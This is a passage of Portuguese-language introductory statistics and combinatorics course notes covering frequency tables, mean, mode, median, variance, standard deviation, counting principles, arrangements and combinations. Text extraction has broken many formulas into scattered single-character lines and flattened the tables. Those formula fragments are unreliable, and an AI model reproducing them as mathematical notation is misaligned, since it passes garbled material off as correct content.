classe e o número total de frequências (observações). Assim: fraci = faci/n. No caso temos 
que:   frac1 = fac1/12 = 3/12 = 1/4 = 0,25 = 25%,   frac2 = fac2/12 = 4/12 = 1/3 @ 0,333 = 
33,33%,   frac3 = fac3/12 = 6/12 = 1/2 = 0,50 = 50%,   facr5 = fac5/12 = 10/12 = 5/6 @ 0,833 
= 83,33% e frac6 = 12/12 = 1/1 = 1 = 100%. Observa-se que a última frequência relativa 
acumulada é 1/1 = 1 = 100%. 
 
 
 
 
 
 
POLÍGONO E CURVAS DE FREQUENCIAS. 
 
O polígono de frequências pode ser obtido ligando-se com uma linha, as ordenadas das 
frequências dos pontos médios dos intervalos de classe. O polígono de frequências 
acumuladas é obtido ligando-se os pontos determinados pelos limites superiores de 
cada classe e as respectivas frequências acumuladas. 
 
Por exemplo: 
 
 
 
 
 
 
 
 
 
 
 
Altura de Alunos (k=6; h=0,07) 
k 
Intervalo 
Pm 
f 
1 
[  1,585  ;  1,655  
[ 
1,62 
7 
2 
[  1,655  ;  1,725  
[ 
1,69 
4 
3 
[  1,725  ;  1,795  
[ 
1,76 
6 
4 
[  1,795  ;  1,865  
[ 
1,83 
6 
5 
[  1,865  ;  1,935  
[ 
1,90 
6 
6 
[  1,935  ;  2,005  
[ 
1,97 
1 
S   
30 
Tabela de frequências 
F 
f 
fac 
fr 
frac 
1 
3 
3 
3/12 = 1/4 = 0,25 = 25,00% 
3/12 = 1/4 = 0,25 = 25,0% 
2 
1 
4 
1/12 @ 0,083 = 8,33% 
4/12 = 1/3 @ 0,333 = 33,33% 
3 
2 
6 
2/12 = 1/6 @ 0,167 = 16,67% 
6/12 = 1/2 = 0,5 = 50,0% 
5 
4 
10 
4/12 = 1/3 @ 0,333 = 33,33% 
10/12 = 5/6 @ 0,833 = 83,33% 
6 
2 
12 
2/12 = 1/6 @ 0,167 = 16,67% 
12/12 = 1/1 = 1 = 100,0% 
 S =   12                     1/1 =  1,000  =  100,00% 
 
 
Polígono de frequências 

UNIDADE 4 – MEDIDAS DE POSIÇÃO E DISPERSÃO 
 
Entraremos agora com inferência estatística, falando sobre medidas de tendência 
centrais: média, mediana e moda, e medidas de dispersão: variância e desvio padrão 
 
4.1 MEDIDAS DE POSIÇÃO 
Indicam uma posição para um conjunto de dados. As medidas de posição mais 
importantes são: média aritmética, desvios, mediana, moda e separatrizes (quartis, 
quintis, decis e percentis). 
 
4.1.1- A MÉDIA ARITMÉTICA  
 
É dada pelo somatório dos valores dividido pela quantidade de valores somados. É 
expressa por: 
. 
 
Ex.01: Média de números. Valores: 5, 1, 4, 6, 3 e 9. 
4,6666...@ 4,667. 
 
Ex.02: “Quantidade de filhos” versus “Pessoas” de uma sala. A média seria a grandeza 
que indica a quantidade “teórica” de filhos por pessoa. 
 
 
 
 
 
 
Simulação de uma pesquisa (TP ou ROL): 
® 0, 0, 0, 1, 1, 2, 2, 2, 2, 3, 4, 4, 4. (n = 13 pessoas pesquisadas). 
Obs1: Total de filhos = S xi.fi = 0.3+1.2+2.4+3.1+4.3 = 0+2+8+3+12 = 25 
Obs2: Total de entrevistados = S fi = n = 3+2+4+1+3 = 13 
 
ou 
n
x
x
x
x
x
n
x
n
x
x
n
n
i
+
+
+
+
+
=
S
=
S
=
-1
3
2
1
....
=
=
+
+
+
+
+
=
+
+
+
+
+
=
S
=
6
28
6
9
3
6
4
1
5
6
6
5
4
3
2
1
x
x
x
x
x
x
n
x
x
i
N. Filhos 
(x) 
f 
0 
3 
1 
2 
2 
4 
3 
1 
4 
3 
S 13 
 
 
923
,1
13
25
13
12
3
8
2
0
13
3.4
1.3
4.2
2.1
3.0
...
...
3
2
1
3
3
2
2
1
1
@
=
+
+
+
+
=
+
+
+
+
=
+
+
+
+
+
+
+
+
=
S
S
=
S
=
n
n
n
i
i
i
f
f
f
f
f
x
f
x
f
x
f
x
f
f
x
n
xf
x

 
 
 
Obs.: “xf “ numa linha indica o total de x na linha. 
P.ex, na linha 3: 2x4=8, ou seja, 4 pessoas têm 2 
filhos (total de 8 filhos). 
 
Ex.03: Estaturas de estudantes. 
 
 
 
 
Obs.:  Tudo ocorre como se cada “f” 
indicasse a repetição do “Pm”(ponto médio) 
das classes.  
 
4.1.2- OS DESVIOS:  
 
São dados pelas diferenças entre cada valor observado (
) e a média dos valores 
.  
 
Ex.01: Valores: 5, 1, 4, 6, 3 e 9. 
 @ 4,667. 
 
 
Ex.02: Valores: 9, 9, 9, 3, 7, 7, 8. 
 @ 7,4286. 
 
 
 
 
923
,1
13
25 @
=
S
S
=
i
i
i
f
f
x
x
429
,
150
21
3159 @
=
S
=
S
S
=
n
f
Pm
f
f
x
x
i
i
i
i
i
ix
x
6
9
3
6
4
1
5
+
+
+
+
+
=
x
7
52
7
8
14
3
27
7
8
)
7.2
(
3
)
9.3
(
7
8
7
7
3
9
9
9
=
+
+
+
=
+
+
+
=
+
+
+
+
+
+
=
x
Filhos (x) 
f 
x.f 
0 
3 
0.3 = 0 
1 
2 
1.2 = 2 
2 
4 
2.4 = 8 
3 
1 
3.1 = 3 
4 
3 
4.3 = 12 
S 
13 
25 
  
k 
Est. (cm) 
Pm (x) 
f 
Pm.f    (=x.f) 
1 
140 ⊢ 146 
143 
6 
858 
2 
146 ⊢ 152 
149 
8 
1192 
3 
152 ⊢ 158 
155 
4 
620 
4 
158 ⊢ 164 
161 
2 
322 
5 
164 ⊢ 170 
167 
1 
167 
S 
21 
3159 
  
Valor 
5 
1 
4 
6 
3 
9 
d 
5-4,667= 
0,333 
1-4,667= 
-3,667 
4-4,667= 
-0,667 
6-4,667= 
1,333 
3-4,667= 
-1,667 
9-4,667= 
4,333 
 
Valor 
9 
9 
9 
3 
7 
7 
8 
d 
9 – 7,4286 = 
1,5714 
9 – 7,4286 = 
1,5714 
9 – 7,4286 = 
1,5714 
3 – 7,4286 = 
-4,4286 
7 – 7,4286 = 
-0,4286 
7 – 7,4286 = 
-0,4286 
8 – 7,4286 = 
0,5714 
 

Neste mesmo exemplo, considerando-se agora as distribuições de frequências, tem-se: 
 
 
 
 
 
 
OBS: A tabela acima mostra que, como existe um desvio para cada valor da Tabela 
Primitiva ou Rol, o somatório dos desvios somente será nulo (ou muito próximo de zero), 
quando ele for obtido a partir de todos os valores dados, ou seja, considerando-se as 
frequências.  
 
 
 
 
 
 
 
 
 
4.1.3- A MODA  
 
É o valor mais frequente, o que mais se repete. Neste curso consideraremos apenas os 
seguintes grupos: amodal, unimodal e multimodal (bimodal e trimodal). No caso de 
agrupamentos, existem processos específicos para cálculo da moda (Czuber, Pearson 
etc) porém, neste curso, consideraremos sempre o valor que corresponde à maior 
frequência.  
 
Ex.01: 
Valores: 5, 1, 4, 6, 3, 4 e 9. 
Moda = 4 (f=2 ® sequência UNIMODAL). 
 
Ex.02: 
Valores: 7, 8, 5, 1, 4, 6, 3, 4, 9, 4, 1 e 1. 
Ex.03: 
x 
f 
xf 
d   (=
) 
f.d 
0 
1 
0 
0-2,68 =  -02,68 
1.(-02,68) = -02,68 
1 
7 
7 
1-2,68 =  -01,68 
7.(-01,68) = -11,76 
2 
21 
42 
2-2,68 =  -00,68 
21.(-00,68) = -14,28 
3 
32 
96 
3-2,68 =   00,32 
32.(00,32)  =  10,24 
4 
14 
56 
4-2,68 =   01,32 
14.(01,32)  =  18,48 
S 75 
201 
-03,40 
00,00 
 
x
xi -
68
,2
75
/
201
/
=
=
S
S
=
i
i
i
f
f
x
x
Valores (x) 
f 
xf 
d   (=
) 
f.d 
9 
3 
27 
9-7,4286 =   1,5714 
3.(1,5714) =  4,7142 
3 
1 
3 
3-7,4286 =  -4,4286 
1.(-4,4286) = -4,4286 
7 
2 
14 
7-7,4286 =  -0,4286 
2.(-0,4286) = -0,8572 
8 
1 
8 
8-7,4286 =   0,5714 
1.(0,5714)  =   0,5714 
S 
7 
52 
-2,7144 
-0,0002 
 
x
xi -
4286
,7
7
/
52
/
@
=
S
S
=
i
i
i
f
f
x
x

Modas = 1 e 4 (f=3 ® Sequência MULTIMODAL / BIMODAL). 
 
Ex.03: 
Valores: 5, 1, 6, 3, 4 e 9. 
Moda = Não existe (Sequência AMODAL). 
 
Ex.04: 
Termos:  L, G, L, K, B, C, K, B, G, K, B, L, B, D, C, D, F, G, G, I, D, e L. 
Rol:        B, B, B, B, C, C, D, D, D, F, G, G, G, G, I, K, K, K, L, L, L e L. 
Moda = B, G e L (f=4 ® Seqüência MULTIMODAL / TRIMODAL). 
 
Ex.05: 
Valores: 10, 20, 30, 40, 10, 20, 30, 40, 10, 20, 30, 40. 
Rol: 10, 10, 10, 20, 20, 20, 30, 30, 30, 40, 40, 40. 
Modas = 10, 20, 30, 40 (3 vezes cada, todos são moda) ® Sequência AMODAL. 
 
 
Ex.06: Observe a tabela abaixo: 
 
O valor que tem maior frequência é 1, logo a Moda é 1 
 
 
 
 
 
Ex.07: 
 
 
No caso de classes, considere a moda como 
sendo o ponto médio (Pm) da classe modal 
(classe de maior f). 
Moda = 149 (f=9). 
 
 
x 
f 
0 
2 
1 
8 
2 
5 
3 
1 
4 
3 
S 
19 
 
k 
Est. (cm) 
Pm (x) 
f 
Pm.f 
1 
140 ⊢ 146 
143 
6 
858 
2 
146 ⊢ 152 
149 
9 
1341 
3 
152 ⊢ 158 
155 
4 
620 
4 
158 ⊢ 164 
161 
2 
322 
5 
164 ⊢ 170 
167 
1 
167 
S 
21 
3308 
  

4.1.4- A MEDIANA 
 
É o valor que se encontra no centro de um rol (termos ordenados e numerados).  
 
Ex.01: Valores: 8, 9, 4, 6, 7. (quantidade ímpar ® n=5). 
Rol: 4 6 7 8 9. 
Termo 
1 
2 
3 
4 
5 
Valor 
4 
6 
7 
8 
9 
Mediana = 7.  Correspondendo ao 3o termo (3a posição no rol). 
 
 
Ex.02: Valores: 51, 12, 41, 41. (quantidade par ® n=4). 
Rol:   12   41   41   51.  
Termo 
1 
2 
3 
4 
Valor 
12 
41 
41 
51 
Mediana = (41+41)/2 = 41.   Correspondendo ao valor entre o 2o e 3o termos. 
 
 
Ex.03: Valores: 14, 11, 17, 22. (quantidade par ® n=4). 
Rol: 11 14 17 22  
Termo 
1 
2 
3 
4 
Valor 
11 
14 
17 
22 
Mediana = (14+17)/2 = 15,5.   Correspondendo ao valor entre o 2o e 3o termos. 
OBS.: Nesse caso, a mediana não está entre os dados fornecidos. 
OBS.: REGRA PARA A DETERMINAÇÃO DAS MEDIANAS (aplicado para muitos 
valores). 
Se n é par ® Termo da Mediana = Termo médio entre os termos “n/2” e “(n/2)+1”. 
Se n é ímpar ® Termo da Mediana = Termo “(n+1)/2”. 
 
Ex.04: Rol: 92, 92, 96, 96, 96, 96, 104, 211, 211. (quantidade ímpar ® n=9). 
Termo 
1 
2 
3 
4 
5 
6 
7 
8 
9 
Valor 
92 
92 
96 
96 
96 
96 
104 
211 
211 

Termo da Mediana (TM) = (n+1)/2 = (9+1)/2 = 10/2 = 5  ® Mediana = 96     (5o termo, 5a 
posição). 
Analisando-se as distribuições de frequências simples e acumuladas, tem-se: 
 
TM=(n+1)/2=(9+1)/2=5 
O TM=5 está na fac=6 (primeira fac 
maior que TM). 
 
OBS.: A posição procurada (TM, no caso) sempre estará na primeira fac que a engloba. 
 
Ex.05: Rol: 77, 77,  82, 82, 82, 89, 91, 91, 92, 98, 98, 98. (quantidade par ® n=12). 
Termo 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
Valor 
77 
77 
82 
82 
82 
89 
91 
91 
92 
98 
98 
98 
TM1 = n/2 = 12/2 = 6           ®    Valor = 89   (6a posição). 
TM2 = (n/2)+1 = 6+1 = 7     ®    Valor = 91   (7a posição). 
Mediana=(89+91)/2=90. (não existe no rol) 
Analisando-se as distribuições de frequências simples e acumuladas, tem-se: 
 
 
OBS.: 
TM1=6 ® fac=6 ® M1=89. 
TM2=7 ® fac=8 ® M2=91. 
Mediana = (89+91)/2 = 90. 
 
Ex.06:   
 
 
n = 15 (ímpar). 
TM = (15+1)/2 = 8    (fac: 5 < TM £ 12 ou 6 £ TM £ 12) 
Mediana = 2 
  
Ex 7: Vamos analisar o caso a seguir: 
x 
f 
fac 
0 
3 
3 
1 
2 
5 
2 
7 
12 
3 
1 
13 
4 
2 
15 
S 
15 
 
 
Valor 
f 
fac 
Termos englobados na fac 
92 
2 
2 
1 e 2              (de 1 a 2) 
96 
4 
6 
3, 4, 5 e 6       (de 3 a 6) 
104 
1 
7 
7                  (só o 7) 
211 
2 
9 
8 e 9               (de 8 a 9) 
S 
9 
 
 
 
Valor 
f 
fac 
Termos englobados na fac 
77 
2 
2 
1 e 2              (de 1 a 2) 
82 
3 
5 
3, 4 e 5          (de 3 a 5) 
89 
1 
6 
6                   (só o 6) 
91 
2 
8 
7 e 8               (de 7 a 8) 
92 
1 
9 
9                    (só o 9) 
98 
3 
12 
10, 11 e 12     (de 10 a 12) 
S 
12 
 
 
 

 
 
 
Ex.08: 
n = 25 (ímpar). 
TM = (25+1)/2 =13    (fac: 8 < TM £ 22 ® k=3) 
 
Obs.: A Mediana está em algum lugar na 3a classe 
(152 < Mediana < 158)  
 
Ex.10: 
 
 
n = 31 (ímpar). 
TM = (31+1)/2 = 16    (fac: 0< TM £ 17 ® k=1) 
 
 
Ex.11: 
Escolas
10
A
0
20
6
6
30
B
20
40
8
14
50
C
40
60
10
24
Classe Mediana ( 22,5 está contido em 24)
70
D
60
80
12
36
90
E
80
100
9
45
Cálculo da Mediana
F.A.M =
F. Acum. 
=
22,5
Amp = 
20
( 60 - 40 )
2
Logo:
Md =
57
Onde:
Md =
Mediana
FMA =
Frequência Acumulada Média
Amp =
Amplitude do Intervalo de Classe
Li =
Limite Inferior da Classe Mediana
FAA =
Frequência Acumulada Anterior à Classe Mediana
FS =
Frequência Simples da Classe Mediana
fi =
Frequência Simples
F. Acum.
Xi
45 / 2 =
40 + { ( 22,5 - 14 ) / 10 } * 20 =
Li + { ( FAM - FAA ) / FS } * Amp =
Notas
fi
k Est. (cm) 
Pm 
f 
fac 
1 
140-146 
143 
3 
3 
2 
146-152 
149 
5 
8 
3 
152-158 
155 
14 
22 
4 
158-164 
161 
2 
24 
5 
164-170 
167 
1 
25 
S 
25 
 
  
k 
Est. (cm) 
Pm 
f 
fac 
1 
140-146 
143 
17 
17 
2 
146-152 
149 
4 
21 
3 
152-158 
155 
2 
23 
4 
158-164 
161 
3 
26 
5 
164-170 
167 
5 
31 
S 
31 
 
  

 
n = 38 (par). 
TM1 = 38/2 = 19        (fac: 12< TM1 £ 21 ® k=3)  
TM2 = (38/2)+1 = 20 (fac: 12< TM2 £ 21 ® k=3) 
Obs.: Considera-se uma distribuição uniforme de 
frequências em cada classe. 
 
4.2- MEDIDAS DE DISPERSÃO:  
 
Indicam a variabilidade (“espalhamento”) dos dados. 
 
4.2.1 – AMPLITUDES:  É a diferença entre o valor máximo e o valor mínimo. 
 
Ex.01: Rol:  21, 32, 64, 148.  Máximo = 148.  Mínimo = 21. Amplitude = 148-21=127. 
 
Ex.02: Rol: 14, 14, 14, 15, 15, 16, 16, 16, 16, 17, 18, 18. 
 
 
Máximo = 18 
Mínimo = 14 
Amplitude = 18 – 14 = 4 
 
Ex.03: 
 
 
 
 
 
 
OBS.: Como mostrado nos exemplos acima, a amplitude considera apenas os limites 
extremos do intervalo, não caracterizando internamente a distribuição dos dados. 
 
 
 
k 
Classes 
Pm 
f 
fac 
1 
14-18 
16 
7 
7 
2 
18-22 
20 
5 
12 
3 
22-26 
24 
9 
21 
4 
26-30 
28 
6 
27 
5 
30-34 
32 
11 
38 
S 
38 
 
  
 Controle de Estoque 
k 
Estoque 
Pm 
f 
Pm.f 
1 
140-146 
143 
6 
858 
2 
146-152 
149 
8 
1192 
3 
152-158 
155 
4 
620 
4 
158-164 
161 
2 
322 
5 
164-170 
167 
1 
167 
S 21 
3159 
  
Amplitude da Amostra = 170-140 = 30. 
 
Amplitude da classe 2 (h) = 152-146 = 6. 
 
OBS.: Todas as classes têm o mesmo “h”. 
x 
f 
14 
3 
15 
2 
16 
4 
17 
1 
18 
2 
S 
12 
 

4.2.2- VARIÂNCIA ( “ s2 ”   ou   “ s2 ” )   
 
A variância é uma medida baseada nos desvios em torno da média e de grande utilidade 
em estatística inferencial e na análise de amostras. (amostra ® s2, população  ® s2). 
 
 
Expressões:    
  ou    
 
 
Onde:  
 
 
 
4.2.3- DESVIO-PADRÃO ( “ s ” ou “ s ” ). 
O DESVIO-PADRÃO é dado pela raiz quadrada da variância (amostras: 
 ou, 
população: 
), tendo então a mesma unidade dos dados analisados. 
 
Ex.01: Rol:  21, 32, 64, 148.  Média: 
 
 
Cálculo da Variância (pela definição): 
 
 
 
Desvio-Padrão:   
 
 
 
(
)
n
x
x
s
ou
i
2
2
2
-
S
=
s
(
)
1
2
2
2
-
-
S
=
n
x
x
s
ou
i
s
(
)
2
2
3
2
2
2
1
2
)
(
.....
)
(
)
(
)
(
x
x
x
x
x
x
x
x
x
x
n
i
-
+
+
-
+
-
+
-
=
-
S
2s
s =
2
s
s =
25
,
66
4
265
4
148
64
32
21
=
=
+
+
+
=
x
(
)
)1
4
(
)
25
,
66
148
(
)
25
,
66
64
(
)
25
,
66
32
(
)
25
,
66
21
(
1
2
2
2
2
2
2
-
-
+
-
+
-
+
-
=
-
-
S
=
n
x
x
s
i
3
0625
,
6683
0625
,5
0625
,
1173
5625
,
2047
3
)
75
,
81
(
)
25
,2
(
)
25
,
34
(
)
25
,
45
(
2
2
2
2
2
+
+
+
=
+
-
+
-
+
-
=
s
9167
,
3302
916667
,
3302
3
75
,
9908
2
2
=
®
@
=
s
s
47
,
57
...
47100719
,
57
916667
,
3302
2
@
®
=
=
=
s
s
s

Ex.02: População:  2, 2, 2, 2, 6, 6, 8, 8, 8, 9. 
 
Média: 
 
Variância: 
 
 
 
 
 
 
 
 
 
Desvio-Padrão: 
 
 
OBS.: Como pode ser visto neste exemplo, no caso da possibilidade de utilização das  
frequências, os quadrados dos desvios deverão ser multiplicados pelas 
respectivas frequências absolutas (simples) dos termos. 
Ex 03: 
Defeitos obtidos em inspeção (x) 
x 
f 
x.f 
xi –
 
(xi –
)2 
fi.(xi –
)2 
0 
2 
0 
–2,6552 
7,0499 
14,0999 
1 
1 
1 
–1,6552 
2,7396 
2,7396 
3,5
10
53
10
9
8
8
8
6
6
2
2
2
2
=
=
+
+
+
+
+
+
+
+
+
=
x
(
)
(
)
(
)
2
2
2
2
1
1
1
1
1
1
x
x
n
x
x
n
n
x
x
s
i
i
i
-
S
-
=
-
S
-
=
-
-
S
=
[
2
2
2
2
2
)
3,5
2
(
)
3,5
2
(
)
3,5
2
(
)
3,5
2
(
1
10
1
-
+
-
+
-
+
-
-
=
s
+
-
+
-
2
2
)3,5
6(
)3,5
6(
]
2
2
2
2
)3,5
9(
)3,5
8(
)3,5
8(
)3,5
8(
-
+
-
+
-
+
-
[
] [
] [
] [
]
{
}
2
2
2
2
2
)
3,5
9
.(
1
)
3,5
8
.(
3
)
3,5
6
.(
2
)
3,5
2
.(
4
9
1
-
+
-
+
-
+
-
=
s
(
)
(
)
2
2
2
1
1
1
1
x
x
f
n
x
x
f
n
s
i
i
i
i
-
S
-
=
úû
ù
êë
é
-
S
-
=
(
)
9,8
9
1,
80
69
,
13
87
,
21
98
,0
56
,
43
9
1
2
=
=
+
+
+
=
s
983
,2
...
983286
,2
9,8
2
@
=
=
=
s
s
x
x
x
OBS.: Distribuições de 
freqüências. 
x 
f 
2 
4 
6 
2 
8 
3 
9 
1 
S 
10 
 
IMPORTANTE: 
Observe que 
nesta fórmula, 
os quadrados 
dos desvios 
estão 
multiplicados 
pelas 
frequências  
(ver tabela 
acima). 

2 
8 
16 
–0,6552 
0,4293 
3,4340 
3 
12 
36 
0,3448 
0,1189 
1,4269 
4 
6 
24 
1,3448 
1,8086 
10,8514 
S 
29 
77 
 
 
32,5517 
 n = 29          
= 77/29 = 2,655172414 @ 2,6552 defeitos. 
defeitos2 
defeitos. 
 
Ex.04: 
Produtos vendidos no dia 
k 
Intervalo 
f 
Pm (x) 
Pm.f 
Pm –
 (Pm –
)2 f.(Pm –
)2 
1 
19 – 23 
25 
21 
525 
–2,5 
6,25 
156,25 
2 
23 – 27 
5 
25 
125 
1,5 
2,25 
11,25 
3 
27 – 31 
10 
29 
290 
5,5 
30,25 
302,50 
S 
 
40 
 
940 
 
 
470,00 
 n = 40        
= S(Pm.f)/n = 940/40 = 23,5 produtos. 
produtos2 
produtos. 
 
 
 
 
 
 
 
 
 
 
n
f
x
x
/
.
S
=
1626
,1
28
5517
,
32
1
29
5517
,
32
1
)
.(
2
2
=
=
-
=
-
-
S
=
n
x
x
f
s
i
i
0782
,1
...
07822
,1
1626
,1
2
@
=
=
=
s
s
x
x
x
n
f
x
x
/
.
S
=
0513
,
12
05128205
,
12
39
00
,
470
1
)
.(
1
)
.(
2
2
2
@
=
=
-
-
S
=
-
-
S
=
n
x
Pm
f
n
x
x
f
s
i
i
i
i
4715
,3
...
47149
,3
0513
,
12
2
@
@=
=
=
s
s

 
 
UNIDADE 5 – Probabilidades 
 
Nessa unidade falaremos sobre definição, princípios, propriedades e cálculo de 
probabilidades. Apresentamos também o conceito de distribuição de probabilidades. 
Para calcular alguns casos de probabilidade precisamos de Análise combinatória, que 
estudaremos inicialmente. 
 
5.1 - ANÁLISE COMBINATÓRIA 
 
A Análise Combinatória disponibiliza métodos para a contagem de elementos de um 
grupo a partir de condições definidas. Ela é muito útil quando são muitos os elementos 
a serem contados. No caso, para fins didáticos, 
utilizaremos 
conjuntos 
de 
relativamente 
pequenas 
dimensões, onde o número de elementos é designado por 
“#”. 
Ex.: Determine a quantidade de números contendo dois algarismos distintos formados 
a partir de 7, 8 e 9. 
X = {78, 79, 87, 89, 97, 98} ® #X=6 
 
 
LEMA 1 DA CONTAGEM: Dados dois conjuntos P={p1, p2,...pm} e Q={q1, q2,...qn} de “m” 
e “n” elementos, respectivamente, é possível formar “m.n” pares (pi,qj) tal que piÎP e 
qjÎQ. 
Ex.: Existem 3 linhas de ônibus que ligam a cidade A à cidade B e 4 linhas ligando a 
cidade B à cidade C. De quantas formas diferentes podemos ir de A até C? 
AB={AB1, AB2, AB3} 
BC={BC1, BC2, BC3, BC4} 
Logo: AC={AB1BC1, AB1BC2, AB1BC3, AB1BC4, AB2BC1, AB2BC2, AB2BC3, AB2BC4, 
AB3BC1, AB3BC2, AB3BC3, AB3BC4}  ® #AC=12 
m \ n 
1 
2 
... 
n 
1 
(p1,q1) 
(p1,q2) 
... 
(p1,qn) 
2 
(p2,q1) 
(p2,q2) 
... 
(p2,qn) 
... 
... 
... 
... 
... 
m 
(pm,q1) 
(pm,q2) 
... 
(pm,qn) 
#(PxQ) = (1, 2, ...,m).(1, 2, ..., n) = m.n 
 
7 
8 
9 
7 
77 
78 
79 
8 
87 
88 
89 
9 
97 
98 
99 
 

 
 
LEMA 2 DA CONTAGEM: Dado o conjunto S={s1, s2,...sm} de “m” elementos, o número 
de pares (si,sj) tal que si¹sj para i¹j é m(m-1). 
Ex.: Quantos números de dois algarismos distintos podemos formar com 3, 4, 5 e 6? 
W={3, 4, 5, 6} 
Logo: N2As={34, 35, 36, 43, 45, 46, 53, 54, 56, 63, 64, 65}  ® #N2As= 4.(4-1) = 4.3 = 
12 
 
 
FATORIAL DE UM NÚMERO:  O fatorial (!) de um número Natural ({0, 1, 2, 3, ...}) “m” é 
definido como sendo:  “m! = m.(m-1).(m-2).(m-3)...3.2.1”. O fatorial de 0 é definido como 
sendo “1”. Assim: 
 
5! = 5.4.3.2.1 = 120 
 
4! = 4.3.2.1 = 24 
 
1! = 1 
 
0! = 1 
 
7! = 7.6.5.4.3.2.1 = 5040 
 
3! = 3.2.1 = 6 
 
 
 
 
 
336
6.7.8
1.6.7.8
!5
!5
.6.7.8
1.2.3.4.5
1.2.3.4.5
.
1
6.7.8
1.2.3.4.5
1.2.3.4.5.6.7.8
!5
!8
=
=
=
=
=
=
15120
5.6.7.8.9
!4
!4
.5.6.7.8.9
!4
!4.5.6.7.8.9
1.2.3.4
1.2.3.4.5.6.7.8.9
!4
!9
=
=
=
=
=
m \ m 
1 
2 
3 
... 
m 
1 
X 
(s1,s2) 
(s1,s3) 
... 
(s1,sm) 
2 
(s2,s1) 
X 
(s2,s3) 
... 
(s2,sm) 
3 
(s3,s1) 
(s3,s2) 
X 
... 
(s3,sm) 
... 
... 
... 
... 
X 
... 
m 
(sm,s1) 
(sm,s2) 
(sm,s3) 
... 
X 
#(SxS/si¹sj) = (1, 2, 3,... , m).(1, 2, 3,..., m-1 ) = m.(m-1) 

 
 
PRINCÍPIO FUNDAMENTAL DA CONTAGEM (PARTE A): Dados r conjuntos: A={a1, 
a2, a3, a4,...,an1},   B={b1, b2, b3, b4,...,bn2}, ....., Z={z1, z2, z3, z4,...,znN}, sendo #A=n1, 
#B=n2,...., #Z=nN. Então, o número de r-uplas (seqüência de r elementos, um de cada 
conjunto) do tipo: aiÎA,  bjÎB,....., zkÎZ é nA.nB....nr. 
 
Ex.1: Uma moeda é lançada 3 vezes, qual o número de seqüências possíveis de Ca e 
Co? 
A={Ca,Co} ® #A=2, B={Ca,Co} ® #B=2, C={Ca,Co} ® #C=2 
#S = 2.2.2 = 8 
 
Ex.2: Dado o conjunto A={1, 2, 3, 4, 5, 6, 7}, determine as quantidades de números que 
podem ser formadas: a) com dois algarismos; b) com três algarismos; e, c) com quatro 
algarismos. 
a) # = 7.7 = 72 = 49 
b) # = 7.7.7 = 73 = 343 
c) # = 7.7.7.7 = 74 = 2401 
  
Ex.3: Dado o conjunto W={v, w, x, y, z}, determine a quantidade de grupos que podem 
ser formados: a) com dois símbolos; b) com três símbolos; e, c) com quatro símbolos. 
a) # = 5.5 = 52 = 25 
b) # = 5.5.5 = 53 = 125 
c) # = 5.5.5.5 = 54 = 625 
 
 
PRINCÍPIO FUNDAMENTAL DA CONTAGEM (PARTE B): Dado um conjunto A com m 
elementos (m³2), logo o conjunto de seqüências de r elementos (r-uplas) formadas com 
elementos distintos dois a dois é:  “m.[m-1].[m-2].[m-3].....[m-(r-1)]”. 
Ex.1: Dado o conjunto A={a, b, c, d, e, f, g, h}®#A=8, Qual a quantidade de seqüências 
de 4 elementos distintos 2 a 2 que pode ser obtida? 
#A=8;   r=4;   r-1=3;   #=8.(8-1).(8-2).(8-3)=8.7.6.5=1680 
 

 
 
Ex.2: Dado o conjunto A={1, 2, 3, 4, 5, 6}, determine as quantidades de números com 
algarismos distintos que podem ser formadas: a) com dois algarismos; b) com três 
algarismos; e, c) com quatro algarismos. 
a) #A=6;   r=2;   r-1=1;    # = 6.(6-1) = 6.5 = 30 
b) #A=6;   r=3;   r-1=2;    # = 6.(6-1).(6-2) = 6.5.4 = 120 
c) #A=6;   r=4;   r-1=3;    # = 6.(6-1).(6-2).(6-3) = 6.5.4.3 = 360 
  
A partir dos princípios fundamentais, é possível o estabelecimento de técnicas para a 
contagem de agrupamentos, definidos como sendo: 1) Arranjos com repetição; 2) 
Arranjos; 3) Permutações; 4) Combinações; e, 5) Permutações com elementos 
repetidos; 
 
 
SEQUENCIA e CONJUNTOS: Uma sequência é um agrupamento onde importa a 
ordem dos elementos. Um conjunto é um agrupamento onde não importa a ordem dos 
elementos. 
Ex.: Sequência A,B,C ¹ Sequência B,A,C   e   {a,b}={b,a}    
   
ARRANJOS COM REPETIÇÃO: 
Dados um conjunto com “m” elementos, um arranjo com repetição é uma sequência de 
r elementos, não necessariamente distintos. A expressão para um arranjo com r 
elementos tomados de um conjunto com m elementos é: 
 
Ex.1: Quantos arranjos de dois elementos, com repetição, podem ser formados com os 
elementos (3, 4, 5, 6)? Prove. 
m=4;   r=2;   #= 4.4 = 42 = 16. 
Prova: (3,3), (3,4), (3,5), (3,6), (4,3), (4,4), (4,5), (4,6), (5,3), (5,4), (5,5), (5,6), (6,3), (6,4), 
(6,5), (6,6). 
 
Ex.2: Uma urna contém 3 bolas: uma vermelha, uma verde e uma marrom. Retirando-
se 2 bolas com reposição, quantas extrações diferentes poderão ocorrer?  
m=3;   r=2;   #= 3.3 = 32 = 9. 
r
r
m
m
m
m
m
m
AR
=
=
...
.
.
)
(
,

 
 
 
ARRANJOS 
Dados um conjunto com “m” elementos, um arranjo é uma sequência de r elementos  
necessariamente distintos. A expressão para um arranjo com r elementos tomados de 
um conjunto com m elementos é: 
 
Ex.1: Quantos arranjos de dois elementos, podem ser formados com os elementos (3, 
4, 5, 6}? Prove. 
m=4;   r=2;   #= 4.(4-1) = 4.3 = 12. 
Prova: (3,4), (3,5), (3,6), (4,3), (4,5), (4,6), (5,3), (5,4), (5,6), (6,3), (6,4), (6,5). 
 
Ex.2: Uma urna contém 3 bolas: uma vermelha, uma verde e uma marrom. Retirando-
se 2 bolas sem reposição, quantas extrações diferentes poderão ocorrer?  
m=3;   r=2 (r-1=1);   #= 3.(3-1) = 3.2 = 6;   
 
 
 
PERMUTAÇÕES 
Dados um conjunto com “m” elementos M={a1, a2, a3, ..., am}, uma permutação é um 
arranjo onde r=m. A fórmula para a quantidade de permutações possíveis é: 
 
Ex.: Permutações de A={1, 2, 3}: (1, 2, 3),  (1, 3, 2), (2, 1, 3), (2, 3, 1),  (3, 1, 2),  (3, 2, 
1)  
 
 
COMBINAÇÕES 
 
Dados um conjunto com “m” elementos {a1, a2, a3, ..., am} chama-se COMBINAÇOES 
de m aos subconjuntos formados por r elementos (conjuntos ® não importa a ordem). 
As combinações possíveis são calculadas fazendo-se: 
 OBS.: "m, rÎN com r£m 
)!
(
!
)]
1
(
].[
3
].[
2
].[
1
.[
,
r
m
m
r
m
m
m
m
m
A
r
m
-
=
-
-
-
-
-
=
6
!1
1.2.3
)!
2
3
(
!3
